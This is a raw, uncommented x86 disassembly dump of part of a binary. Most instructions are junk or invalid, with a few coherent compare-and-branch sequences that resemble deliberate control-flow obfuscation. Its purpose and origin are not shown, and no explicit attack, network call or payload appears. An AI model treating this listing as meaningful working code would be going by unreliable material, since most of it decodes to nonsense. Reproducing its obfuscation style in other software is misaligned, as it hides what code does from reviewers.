  4018f8:	push   ds
  4018f9:	jae    0x40196f
  4018fb:	outs   dx,DWORD PTR ds:[esi]
  4018fc:	xchg   edx,eax
  4018fd:	je     0x4018e5
  4018ff:	add    DWORD PTR [ecx-0x32],edx
  401902:	xchg   ebp,eax
  401903:	sar    BYTE PTR [ecx],cl
  401905:	dec    edx
  401906:	test   BYTE PTR [edx],bl
  401908:	repz dec esi
  40190a:	xor    BYTE PTR [ebx],dl
  40190c:	xor    DWORD PTR [edx-0x1f],ebp
  40190f:	dec    edi
  401910:	xchg   ebp,eax
  401911:	sbb    ch,BYTE PTR [edi+0x23dec237]
  401917:	ds xor eax,0x326414bd
  40191d:	jmp    0xb862:0x839cee02
  401924:	jno    0x40194b
  401926:	daa    
  401927:	rol    bl,0x46
  40192a:	cld    
  40192b:	je     0x401972
  40192d:	dec    eax
  40192e:	cmp    DWORD PTR [eax+edx*2-0x153ee2a0],esi
  401935:	push   eax
  401936:	repz daa 
  401938:	push   edx
  401939:	or     eax,0xabf45c17
  40193e:	cmp    eax,0x8b094094
  401943:	test   eax,0xb358826a
  401948:	or     eax,eax
  40194a:	inc    eax
  40194b:	call   0xe445:0x8be44589
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xb17bf628
  401994:	sub    esp,DWORD PTR [edi+ecx*1+0x70]
  401998:	jp     0x401a0a
  40199a:	jo     0x401a0c
  40199c:	jle    0x401a0e
  40199e:	jo     0x401952
  4019a0:	push   ss
  4019a1:	add    eax,DWORD PTR [ebp+0x33]
  4019a4:	inc    eax
  4019a5:	pop    es
  4019a6:	je     0x401a26
  4019a8:	inc    edx
  4019a9:	retf   
  4019aa:	or     edx,esp
  4019ac:	mov    DWORD PTR [eax-0x9],eax
  4019af:	xor    ecx,edi
  4019b1:	push   ecx
  4019b2:	dec    cx
  4019b4:	cmp    DWORD PTR [edx-0x863960d],edx
  4019ba:	xlat   BYTE PTR ds:[ebx]
  4019bb:	cmp    ecx,esp
  4019bd:	push   esi
  4019be:	call   0xf426:0x1d02092c
  4019c5:	leave  
  4019c6:	fldenv [edi]
  4019c8:	in     al,0xa6
  4019ca:	sub    BYTE PTR [ebp+0x5b],bh
  4019cd:	fdivr  QWORD PTR [ebx-0x586f6d19]
  4019d3:	sub    ecx,ecx
  4019d5:	(bad)  
  4019d7:	lds    esi,FWORD PTR [esi-0x3c]
  4019da:	enter  0xf6a5,0x72
  4019de:	xchg   ebp,eax
  4019df:	xor    eax,0xc40906a4
  4019e4:	imul   edx,DWORD PTR [ecx*8-0x46d9171],0x4f
  4019ec:	std    
  4019ed:	mov    eax,ds:0xb81c4326
  4019f2:	lods   eax,DWORD PTR ds:[esi]
  4019f3:	pushf  
  4019f4:	out    dx,eax
  4019f5:	iret   
  4019f6:	add    al,0xe1
  4019f8:	dec    ecx
  4019f9:	lods   al,BYTE PTR ds:[esi]
  4019fa:	es (bad) 
  4019fc:	scas   eax,DWORD PTR es:[edi]
  4019fd:	aam    0xc4
  4019ff:	inc    edi
  401a00:	jno    0x401a0e
  401a02:	xlat   BYTE PTR ds:[ebx]
  401a03:	dec    ecx
  401a04:	pop    eax
  401a05:	jbe    0x4019be
  401a07:	mov    ecx,0x185824de
  401a0c:	popa   
  401a0d:	in     al,dx
  401a0e:	out    0xf5,eax
  401a10:	push   ebp
  401a11:	loopne 0x4019b4
  401a13:	cs ret 0xb4a3
  401a17:	push   edx
  401a18:	daa    
  401a19:	das    
  401a1a:	ret    
  401a1b:	out    0xd0,al
  401a1d:	les    eax,FWORD PTR ds:0xf57af3eb
  401a23:	cwde   
  401a24:	aas    
  401a25:	ins    DWORD PTR es:[edi],dx
  401a26:	mov    dl,BYTE PTR [eax+ebx*2-0x3a]
  401a2a:	mov    ds:0x456fd69a,eax
  401a2f:	mov    edi,0xf4c25bac
  401a34:	jmp    0x401a21
  401a36:	stc    
  401a37:	(bad)  
  401a38:	dec    edi
  401a39:	adc    edx,DWORD PTR [edx+edi*1+0xc]
  401a3d:	mov    ch,0x25
  401a3f:	pop    edi
  401a40:	xor    BYTE PTR [edx+ebp*1-0x42],0x5b
  401a45:	mov    ebx,0x640dd399
  401a4a:	adc    eax,0x1f13f28e
  401a4f:	cdq    
  401a50:	(bad)  
  401a51:	push   0x7f1cbe8f
  401a56:	xor    BYTE PTR [ebp+eiz*2-0x17ad5fb6],dh
  401a5d:	pop    ecx
  401a5e:	in     eax,dx
  401a5f:	sbb    cl,BYTE PTR [ebp-0x2c]
  401a62:	jbe    0x401a49
  401a64:	and    DWORD PTR [esi+0x7b],edx
  401a67:	into   
  401a68:	xor    eax,0x4cf40cb6
  401a6d:	je     0x401a6b
  401a6f:	shl    DWORD PTR [edi+0x6d67b815],0xa5
  401a76:	aad    0xe7
  401a78:	es or  eax,0x5c69e720
  401a7e:	into   
  401a7f:	repz scas al,BYTE PTR es:[edi]
  401a81:	sbb    eax,0x7b6a8bba
  401a86:	push   eax
  401a87:	add    edx,DWORD PTR [ebx+0x707b30f3]
  401a8d:	test   al,0xa0
  401a8f:	nop
  401a90:	retf   
  401a91:	pusha  
  401a92:	push   ecx
  401a93:	pop    edi
  401a94:	hlt    
  401a95:	add    esp,DWORD PTR [esi-0xa3afe6a]
  401a9b:	add    eax,0xe5083a8
  401aa0:	scas   eax,DWORD PTR es:[edi]
  401aa1:	dec    edx
  401aa2:	outs   dx,BYTE PTR ds:[esi]
  401aa3:	push   0x6e5fe161
  401aa8:	pushf  
  401aa9:	jo     0x401afd
  401aab:	int    0xc0
  401aad:	inc    eax
  401aae:	jmp    0x401a6e
  401ab0:	cld    
  401ab1:	popa   
  401ab2:	repnz imul eax,DWORD PTR [ecx-0x77],0x52
  401ab7:	push   ebx
  401ab8:	jnp    0x401a70
  401aba:	popa   
  401abb:	call   0x72effabf
  401ac0:	stos   DWORD PTR es:[edi],eax
  401ac1:	or     al,0x90
  401ac3:	aam    0x63
  401ac5:	cld    
  401ac6:	xchg   DWORD PTR [ebx-0x1a6bd0f3],esp
  401acc:	sbb    eax,0xf
  401acf:	jne    0x401b4c
  401ad1:	aaa    
  401ad2:	call   0xb414:0x1751d1a1
  401ad9:	(bad)  
  401ada:	xchg   ebx,eax
  401adb:	jmp    0x401aaa
  401add:	xor    eax,0x94d67b04
  401ae2:	rsm    
  401ae4:	and    al,0x58
  401ae6:	or     DWORD PTR [edi],0x54
  401ae9:	out    0xf4,eax
  401aeb:	add    al,0x33
  401aed:	xchg   ebp,eax
  401aee:	lods   al,BYTE PTR ds:[esi]
  401aef:	fcom   QWORD PTR [esi+0x74]
  401af2:	inc    edx
  401af3:	cmp    BYTE PTR [ebx+0x6b],dl
  401af6:	sub    DWORD PTR [edx-0x33],esi
  401af9:	dec    ecx
  401afa:	pusha  
  401afb:	add    DWORD PTR [ebx],ebx
  401afd:	ds aad 0xde
  401b00:	inc    ebx
  401b01:	mov    bh,0xe5
  401b03:	mov    cl,0xb1
  401b05:	sub    cl,ch
  401b07:	xor    BYTE PTR [edi],0x10
  401b0a:	ds hlt 
  401b0c:	int    0xd8
  401b0e:	jl     0x401af9
  401b10:	daa    
  401b11:	loope  0x401b34
  401b13:	outs   dx,BYTE PTR ds:[esi]
  401b14:	retf   
  401b15:	inc    ebx
  401b16:	xchg   esp,eax
  401b17:	push   0x3a4f46fb
  401b1c:	sbb    al,0x4e
  401b1e:	mov    edx,0xcaa310c2
  401b23:	sti    
  401b24:	sti    
  401b25:	ja     0x401ac4
  401b27:	(bad)  
  401b28:	sub    DWORD PTR [ebp+0x65],edx
  401b2b:	(bad)  [ecx]
  401b2d:	cmp    BYTE PTR [edx+edx*1+0x766f26ab],0x2a
  401b35:	dec    eax
  401b36:	cmp    eax,esi
  401b38:	sbb    al,0x98
  401b3a:	inc    edx
  401b3b:	pop    ss
  401b3c:	fbld   TBYTE PTR [eax]
  401b3e:	or     edi,esp
  401b40:	mov    bl,0x4d
  401b42:	jg     0x401b7d
  401b44:	dec    ebp
  401b45:	mov    eax,DWORD PTR [ecx+0x74]
  401b48:	mov    bh,0xcf
  401b4a:	dec    eax
  401b4c:	and    al,0x20
  401b4e:	xor    DWORD PTR [eax*8+0xe87f890],eax
  401b55:	pop    edx
  401b56:	mov    eax,ds:0x15a2fdc0
  401b5b:	leave  
  401b5c:	cmp    bl,BYTE PTR [ebx+0xb]
  401b5f:	pop    edx
  401b60:	inc    ebp
  401b61:	ins    DWORD PTR es:[edi],dx
  401b62:	and    al,0x95
  401b64:	fcom   DWORD PTR [esp+edx*8+0x3eb7b8e4]
  401b6b:	xor    DWORD PTR ds:0xad5271b3,ecx
  401b71:	lahf   
  401b72:	pop    ebp
  401b73:	iret   
  401b74:	ds push ss
  401b76:	pop    ebp
  401b77:	adc    BYTE PTR ds:0xaea7dba,ah
  401b7d:	xor    BYTE PTR [ecx-0x35f8ee0d],ah
  401b83:	mul    DWORD PTR [edx-0x2998b244]
  401b89:	test   eax,0xae824074
  401b8e:	fidivr DWORD PTR [ebp-0xef3943e]
  401b94:	sub    edx,edi
  401b96:	ja     0xe280c8d9
  401b9c:	inc    ecx
  401b9d:	in     eax,dx
  401b9e:	sub    DWORD PTR [ebx+0x108bf045],ecx
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dh,BYTE PTR [eax+0x3]
  401bde:	into   
  401bdf:	xchg   ecx,eax
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	add    eax,0x57a5df59
  401bed:	dec    esi
  401bee:	jle    0x401c28
  401bf0:	das    
  401bf1:	push   eax
  401bf2:	cwde   
  401bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bf4:	pop    eax
  401bf5:	mov    cl,0x2
  401bf7:	les    edi,FWORD PTR [ebp-0x26]
  401bfa:	ds stos DWORD PTR es:[edi],eax
  401bfc:	adc    al,0x4e
  401bfe:	push   ds
  401bff:	fisubr DWORD PTR ss:[eax+0x21]
  401c03:	lock cs mov ebx,0x5a3feeee
  401c0a:	adc    ecx,edi
  401c0c:	xchg   esp,eax
  401c0d:	scas   eax,DWORD PTR es:[edi]
  401c0e:	pop    es
  401c0f:	in     al,0x2a
  401c11:	lods   al,BYTE PTR ds:[esi]
  401c12:	repz hlt 
  401c14:	mov    ah,0xee
  401c16:	jnp    0x401c45
  401c18:	push   ebx
  401c19:	sub    al,0x2e
  401c1b:	es data16 fsubrp st(6),st
  401c1f:	sub    ebx,DWORD PTR ds:0x1b32f701
  401c25:	sbb    ebx,DWORD PTR [eax+0x50043a2a]
  401c2b:	loope  0x401c40
  401c2d:	(bad)  
  401c2e:	jnp    0x401c2f
  401c30:	imul   edi,DWORD PTR [ebp-0x408c74e2],0x54401bbd
  401c3a:	push   0x6b
  401c3c:	xor    edi,DWORD PTR [ebp+0x56]
  401c3f:	pop    ds
  401c40:	mov    ebx,0xf75780a6
  401c45:	jle    0x401bf6
  401c47:	pusha  
  401c48:	inc    esi
  401c49:	je     0x401bdb
  401c4b:	ficomp DWORD PTR [esi-0x5e]
  401c4e:	xor    DWORD PTR [ebp-0x7d],ebx
  401c51:	cs inc esi
  401c53:	sahf   
  401c54:	xchg   esi,eax
  401c55:	dec    edx
  401c56:	aad    0x93
  401c58:	shl    BYTE PTR [edi-0x65],cl
  401c5b:	and    BYTE PTR [edi],bh
  401c5d:	jne    0x401c58
  401c5f:	stos   BYTE PTR es:[edi],al
  401c60:	popa   
  401c61:	cmp    esp,DWORD PTR [ebx+0x50eabb70]
  401c67:	sbb    cl,cl
  401c69:	inc    edi
  401c6a:	push   0xc0322a8c
  401c6f:	imul   eax,DWORD PTR [ecx],0xf017f9f2
  401c75:	jl     0x401c42
  401c77:	rcr    DWORD PTR [edi],0x6f
  401c7a:	and    BYTE PTR [ebp-0x5d],ah
  401c7d:	lods   eax,DWORD PTR ds:[esi]
  401c7e:	cmp    esp,esp
  401c80:	xchg   edi,eax
  401c81:	mov    edi,0x946a840f
  401c86:	bound  esi,QWORD PTR [edx+esi*2]
  401c89:	cld    
  401c8a:	adc    esi,DWORD PTR [ebx]
  401c8c:	mov    eax,ds:0x4c6c21f2
  401c91:	repnz and al,BYTE PTR [ebx]
  401c94:	mov    eax,DWORD PTR ss:[ebp+0x3cf65992]
  401c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c9c:	mov    ch,0xae
  401c9e:	pop    edx
  401c9f:	mov    ds:0xdcdb709f,al
  401ca4:	out    0x55,al
  401ca6:	imul   eax,edx,0xffffff94
  401ca9:	cmp    BYTE PTR [edx-0x53487b4],dl
  401caf:	lahf   
  401cb0:	sub    dh,BYTE PTR [ecx+0x7b]
  401cb3:	leave  
  401cb4:	mov    esi,0xe1db3c9a
  401cb9:	pop    esp
  401cba:	retf   
  401cbb:	dec    edx
  401cbc:	push   ecx
  401cbd:	xchg   edx,eax
  401cbe:	scas   eax,DWORD PTR es:[edi]
  401cbf:	int3   
  401cc0:	pop    ss
  401cc1:	test   eax,0xdf27691a
  401cc6:	pop    esi
  401cc7:	cs dec edi
  401cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cca:	dec    ecx
  401ccb:	dec    edx
  401ccc:	loopne 0x401cb5
  401cce:	add    DWORD PTR [eax],edi
  401cd0:	imul   ebp,ebp,0x60
  401cd3:	out    dx,eax
  401cd4:	js     0x401d18
  401cd6:	repnz cli 
  401cd8:	adc    esp,edx
  401cda:	leave  
  401cdb:	and    BYTE PTR [esi],al
  401cdd:	jecxz  0x401d23
  401cdf:	cmp    BYTE PTR [ebx],0x47
  401ce2:	adc    BYTE PTR [ecx],al
  401ce4:	mov    BYTE PTR [ecx-0x3d],dl
  401ce7:	sub    DWORD PTR [ecx+0x598c1eb9],edx
  401ced:	popf   
  401cee:	mov    al,ds:0x66a4b0b8
  401cf3:	xor    eax,0x3c124b39
  401cf8:	mov    al,ds:0x118cc127
  401cfd:	nop
  401cfe:	jb     0x401cfa
  401d00:	mov    eax,ds:0x6821774a
  401d05:	xchg   DWORD PTR [eax+ebp*8-0x26233f51],ebp
  401d0c:	ins    DWORD PTR es:[edi],dx
  401d0d:	sbb    DWORD PTR [eax-0x34de5688],ebx
  401d13:	mov    DWORD PTR [eax-0x6a083b73],eax
  401d19:	loopne 0x401d4f
  401d1b:	adc    al,0x53
  401d1d:	sbb    BYTE PTR [esi],ah
  401d1f:	add    esp,ebp
  401d21:	sar    DWORD PTR [esi],0xed
  401d24:	sbb    eax,0x9bef8a21
  401d29:	test   DWORD PTR [ecx],ecx
  401d2b:	xor    BYTE PTR [edx],dl
  401d2d:	data16 outs dx,BYTE PTR ds:[esi]
  401d2f:	push   edx
  401d30:	pop    es
  401d31:	sub    al,0xfe
  401d33:	test   eax,0xd43e5c3b
  401d38:	push   ds
  401d39:	push   edx
  401d3a:	mov    BYTE PTR [edx+0x7a40c2d4],ah
  401d40:	xchg   ecx,eax
  401d41:	dec    ecx
  401d42:	clc    
  401d43:	inc    edi
  401d44:	sbb    BYTE PTR [ecx-0x1c],bh
  401d47:	das    
  401d48:	hlt    
  401d49:	pop    ss
  401d4a:	push   ebp
  401d4b:	xor    dh,BYTE PTR [edx+eax*8-0x2ffd894e]
  401d52:	cmc    
  401d53:	fs jg  0x401d2e
  401d56:	imul   esp,DWORD PTR [esi+0x32f22f99],0x74
  401d5d:	sbb    ch,BYTE PTR [edx]
  401d5f:	xchg   BYTE PTR [ebx],cl
  401d61:	push   ss
  401d62:	adc    eax,0x531e9452
  401d67:	xchg   esp,eax
  401d68:	xchg   esp,eax
  401d69:	pop    ebp
  401d6a:	shl    bh,0x52
  401d6d:	ror    BYTE PTR [ecx],cl
  401d6f:	jnp    0x401d1c
  401d71:	call   0xb4645a06
  401d76:	inc    eax
  401d77:	mov    cl,0x67
  401d79:	jmp    0x78d10e36
  401d7e:	and    al,0x59
  401d80:	cmp    dh,BYTE PTR [esi-0x6b]
  401d83:	adc    al,0x58
  401d85:	loopne 0x401e00
  401d87:	inc    ecx
  401d88:	shl    DWORD PTR [ebx-0x70dd9c0e],1
  401d8e:	and    eax,0xad20d585
  401d93:	xchg   edx,eax
  401d94:	(bad)  
  401d95:	aad    0x63
  401d97:	xchg   esp,eax
  401d98:	or     BYTE PTR [esi],0xb6
  401d9b:	iret   
  401d9c:	add    bl,ch
  401d9e:	imul   esp,DWORD PTR [eax],0xfffffffd
  401da1:	lahf   
  401da2:	in     eax,dx
  401da3:	lds    eax,FWORD PTR [edi]
  401da5:	mov    esp,0xb89130b9
  401daa:	in     al,0x54
  401dac:	cmp    bp,ax
  401daf:	jmp    0x5f79e449
  401db4:	stc    
  401db5:	push   ecx
  401db6:	neg    BYTE PTR [ebx+0x29fce079]
  401dbc:	aas    
  401dbd:	xchg   ebx,eax
  401dbe:	mov    ebp,0x40c259d8
  401dc3:	mov    edi,0x4713b020
  401dc8:	(bad)  
  401dc9:	fimul  WORD PTR [ebx-0x72]
  401dcc:	xor    dl,dl
  401dce:	lahf   
  401dcf:	dec    esi
  401dd0:	fnsave [edi-0x1a]
  401dd3:	getsec 
  401dd5:	pop    es
  401dd6:	push   edi
  401dd7:	cli    
  401dd8:	sub    DWORD PTR [eax],0xffffffc4
  401ddb:	pop    ds
  401ddc:	mov    fs,WORD PTR [esi+0x10]
  401ddf:	jae    0x401e3e
  401de1:	xor    BYTE PTR [ecx-0x15],bh
  401de4:	pushf  
  401de5:	cmp    eax,eax
  401de7:	call   0x3e2862ef
  401dec:	jge    0x401e42
  401dee:	retf   0xf6c
  401df1:	test   BYTE PTR [esi],cl
  401df3:	add    BYTE PTR [eax],al
  401df5:	add    BYTE PTR [ebx+0x2081f045],cl
  401dfb:	cdq    
  401dfc:	sbb    al,0x75
  401dfe:	add    cl,ch
  401e00:	sub    DWORD PTR [ecx],ecx
  401e02:	add    BYTE PTR [eax],al
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esi+eax*8-0x4a],dl
  401e44:	or     al,0x5
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	xchg   ebx,eax
  401e4f:	cmp    DWORD PTR [edx],ecx
  401e51:	rol    esp,cl
  401e53:	sbb    DWORD PTR [ecx-0x67],ebx
  401e56:	retf   0xf1e0
  401e59:	fcomp  QWORD PTR [ecx]
  401e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e5c:	pop    ds
  401e5d:	jmp    0xa23b6d12
  401e62:	xlat   BYTE PTR ds:[ebx]
  401e63:	and    dh,bl
  401e65:	loope  0x401e77
  401e67:	idiv   DWORD PTR [eax-0x68]
  401e6a:	sub    cl,bh
  401e6c:	push   ebx
  401e6d:	scas   al,BYTE PTR es:[edi]
  401e6e:	mov    ah,0xbd
  401e70:	shr    BYTE PTR [esi-0x20bee1c3],cl
  401e76:	pushf  
  401e77:	int3   
  401e78:	(bad)  
  401e79:	call   0x386:0x6c6d4fa0
  401e80:	xchg   DWORD PTR [bx+0x4fdc],edi
  401e85:	pop    ecx
  401e86:	or     al,0x62
  401e88:	test   eax,0xde5545a3
  401e8d:	pop    edi
  401e8e:	fdiv   st(7),st
  401e90:	jl     0x401eaa
  401e92:	call   0xcb18b6f2
  401e97:	mov    dl,0x84
  401e99:	sbb    BYTE PTR [ecx],bh
  401e9b:	test   BYTE PTR [ebp+0x34],bh
  401e9e:	push   0x59
  401ea0:	test   eax,0x4785bf6f
  401ea5:	cwde   
  401ea6:	rcl    DWORD PTR ds:0x6c10ddd,1
  401eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ead:	xor    eax,0x306db5e2
  401eb2:	adc    al,0xc2
  401eb4:	out    0x4,eax
  401eb6:	mov    ch,0xd3
  401eb8:	pop    edx
  401eb9:	jmp    0x19e1a303
  401ebe:	repnz out 0x92,al
  401ec1:	dec    esp
  401ec2:	xor    dl,BYTE PTR [edi]
  401ec4:	mov    bh,0x31
  401ec6:	(bad)  
  401ec7:	imul   eax,DWORD PTR [esi-0x78],0x5e810d36
  401ece:	adc    DWORD PTR [ebx],eax
  401ed0:	in     eax,0x10
  401ed2:	or     eax,0x19975191
  401ed7:	stos   DWORD PTR es:[edi],eax
  401ed8:	enter  0x8bd6,0x1f
  401edc:	inc    esp
  401edd:	jnp    0x401f32
  401edf:	or     eax,0xe2ec4af4
  401ee4:	pop    ds
  401ee5:	iret   
  401ee6:	ja     0x401ef2
  401ee8:	add    BYTE PTR [eax],dh
  401eea:	or     WORD PTR [eax-0x6167baa2],sp
  401ef1:	call   0x84557fea
  401ef6:	inc    ecx
  401ef7:	fs rcl ecx,cl
  401efa:	pop    ecx
  401efb:	dec    ebx
  401efc:	or     BYTE PTR [esp+edx*4+0x54],bl
  401f00:	loope  0x401f3f
  401f02:	mov    DWORD PTR ds:0xf339ce0d,0xf518a5f
  401f0c:	xor    edx,DWORD PTR [ebx]
  401f0e:	enter  0x410e,0x6c
  401f12:	dec    ecx
  401f13:	out    0x1,eax
  401f15:	popa   
  401f16:	(bad)  
  401f17:	ins    BYTE PTR es:[edi],dx
  401f18:	in     eax,0xf
  401f1a:	pop    ss
  401f1b:	mov    ecx,0x9c8c6f5d
  401f20:	and    dh,al
  401f22:	pushf  
  401f23:	jmp    esi
  401f25:	push   ebx
  401f26:	cmc    
  401f27:	sbb    al,0x41
  401f29:	or     BYTE PTR [edx],dl
  401f2b:	inc    esi
  401f2c:	adc    DWORD PTR [edx-0x42b0938],eax
  401f32:	pop    esp
  401f33:	pop    ds
  401f34:	scas   al,BYTE PTR es:[edi]
  401f35:	sti    
  401f36:	and    cl,BYTE PTR [edi]
  401f38:	or     eax,0xd8a703a8
  401f3d:	int    0x2b
  401f3f:	rcr    BYTE PTR [ebx-0x41f06e56],1
  401f45:	sub    DWORD PTR [ecx+0x67cf2a0],0xffffff96
  401f4c:	popf   
  401f4d:	es popa 
  401f4f:	sub    eax,0x6b3f5085
  401f54:	pop    ebx
  401f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f56:	lea    ecx,[esi+ebp*1-0x48]
  401f5a:	mov    DWORD PTR [ebx+0x35],edi
  401f5d:	arpl   di,dx
  401f5f:	add    al,0xaa
  401f61:	dec    ebp
  401f62:	lods   al,BYTE PTR ds:[esi]
  401f63:	cmp    ebx,DWORD PTR [edx+ebx*8]
  401f66:	lock push ebp
  401f68:	cs dec edx
  401f6a:	xor    al,0xc7
  401f6c:	mov    eax,0xc63c1697
  401f71:	sbb    edx,DWORD PTR [edx]
  401f73:	push   esp
  401f74:	mov    cl,0x65
  401f76:	xchg   ebp,eax
  401f77:	dec    DWORD PTR [esp+eiz*4-0x27d18d5a]
  401f7e:	or     al,0x34
  401f80:	adc    BYTE PTR [ebx*2+0x318d0d22],0x31
  401f88:	dec    esp
  401f89:	inc    esi
  401f8a:	xchg   ecx,eax
  401f8b:	jg     0x401ffb
  401f8d:	mov    ds:0xfa38e21f,al
  401f92:	mov    al,ds:0x8653e735
  401f97:	fidiv  DWORD PTR [eax+0x32a131e9]
  401f9d:	inc    DWORD PTR [edx-0x2d]
  401fa0:	mov    al,0xf7
  401fa2:	in     al,0xb4
  401fa4:	lock in eax,0x5f
  401fa7:	imul   edi,DWORD PTR [edi-0x54f06671],0xacbda206
  401fb1:	add    eax,0x88fdcb8
  401fb6:	sbb    DWORD PTR [esi],0xfffffff9
  401fb9:	inc    ebp
  401fba:	adc    ecx,DWORD PTR [esi-0x49]
  401fbd:	lods   eax,DWORD PTR ds:[esi]
  401fbe:	or     dh,bh
  401fc0:	or     eax,DWORD PTR [ecx]
  401fc2:	sub    DWORD PTR [ecx],ebp
  401fc4:	ss fsubr QWORD PTR fs:[esi+0x51]
  401fc9:	dec    ebx
  401fca:	stos   BYTE PTR es:[edi],al
  401fcb:	jns    0x401f5e
  401fcd:	lods   eax,DWORD PTR ds:[esi]
  401fce:	out    dx,eax
  401fcf:	inc    edx
  401fd0:	sub    al,0x85
  401fd2:	fsub   st(5),st
  401fd4:	out    dx,eax
  401fd5:	pop    edi
  401fd6:	mov    cl,0xcd
  401fd8:	ins    BYTE PTR es:[edi],dx
  401fd9:	dec    ebp
  401fda:	iret   
  401fdb:	retf   0xbeab
  401fde:	clc    
  401fdf:	adc    BYTE PTR [edi+0x1f],0x72
  401fe3:	mov    bl,0x51
  401fe5:	jb     0x402059
  401fe7:	std    
  401fe8:	mov    dl,0xc3
  401fea:	neg    DWORD PTR [esi+0x4f]
  401fed:	pusha  
  401fee:	stos   BYTE PTR es:[edi],al
  401fef:	jmp    0xabe7c493
  401ff4:	xchg   DWORD PTR [edi+eax*1-0x1e],edx
  401ff8:	pop    esp
  401ff9:	xor    DWORD PTR [ecx+eax*4-0x4f],ecx
  401ffd:	cld    
  401ffe:	aad    0xe9
  402000:	xchg   ecx,eax
  402001:	aad    0xb5
  402003:	imul   ebp,edi,0x44
  402006:	pusha  
  402007:	pop    edi
  402008:	lahf   
  402009:	mov    al,BYTE PTR [eax+0x295a1cf1]
  40200f:	sub    al,0x7c
  402011:	cld    
  402012:	bound  eax,QWORD PTR [ebx]
  402014:	frstor [esi]
  402016:	aaa    
  402017:	xchg   DWORD PTR [edi-0x10],ebx
  40201a:	mov    edx,0x305ce431
  40201f:	add    dh,BYTE PTR [ecx-0x566cfc78]
  402025:	jo     0x40208e
  402027:	mov    al,0x80
  402029:	sbb    eax,0xe14417ec
  40202e:	adc    ecx,edi
  402030:	mov    ah,dl
  402032:	push   eax
  402033:	mov    edx,0x8ae630e7
  402038:	inc    esp
  402039:	push   edx
  40203a:	push   edi
  40203b:	aas    
  40203c:	jge    0x401fc5
  40203e:	add    eax,0xc87c989f
  402043:	jmp    FWORD PTR [ecx]
  402045:	inc    ecx
  402046:	jbe    0x402029
  402048:	ins    BYTE PTR es:[edi],dx
  402049:	xor    al,0xd2
  40204b:	xchg   edi,eax
  40204c:	popa   
  40204d:	leave  
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	add    BYTE PTR [eax+0x41],0x79
  40206d:	jmp    0x70b024e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	fdivr  DWORD PTR [esi+0x27]
  402079:	add    BYTE PTR [ecx-0x5163ad6b],bh
  40207f:	in     al,0xff
  402081:	inc    eax
  402082:	test   eax,0x9182095d
  402087:	jae    0x40201b
  402089:	or     al,0xf4
  40208b:	mov    ds:0x8bb2287b,eax
  402090:	gs ret 0x8d97
  402094:	or     eax,0xc9133656
  402099:	jmp    0x12f0b867
  40209e:	in     eax,dx
  40209f:	sub    BYTE PTR [edx-0x7adadae],cl
  4020a5:	mov    esp,0xa3207eab
  4020aa:	add    edx,DWORD PTR [eax-0xc]
  4020ad:	inc    ebp
  4020ae:	xor    DWORD PTR [ebx+0x48],esp
  4020b1:	push   esi
  4020b2:	mov    ah,0x2a
  4020b4:	jl     0x402042
  4020b6:	call   0xe1f2:0x430b7847
  4020bd:	xchg   esi,eax
  4020be:	cmp    BYTE PTR [eax-0x73282b27],ch
  4020c4:	sub    DWORD PTR [esi+esi*2+0x560534b4],ebp
  4020cb:	mov    ebx,DWORD PTR [ebp+0x32]
  4020ce:	(bad)  
  4020cf:	rcl    DWORD PTR [ecx],1
  4020d1:	sub    edi,DWORD PTR [ebx-0x6c1dd54]
